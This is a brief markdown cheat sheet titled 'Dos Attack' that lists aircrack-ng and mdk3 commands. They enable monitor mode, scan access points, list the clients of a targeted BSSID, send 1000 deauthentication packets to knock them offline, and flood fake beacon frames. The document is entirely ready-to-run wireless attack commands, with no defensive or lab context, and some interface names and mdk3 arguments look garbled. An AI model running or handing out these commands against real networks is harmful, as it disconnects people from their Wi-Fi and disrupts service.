# Dos Attack

Start monitor mode
```bash
└──╼ #airmon-ng start wlx5
```
Scan All the access points
```bash
└──╼ #airodump-ng wlx5
```
show the clients connect to the network
```bash
└──╼ #airodump-ng -c 7 --bssid 28:DE:E5:BA:BC:C8  wlx
```
To dos attack || Send packs
```bash
└──╼ #aireplay-ng -0 1000 -a 28:DE:E5:BA:BC:C8 wlx502b73a0015b

```
Fake flood wireless networks
```bash
mdk3 walan0man b -c 5
```
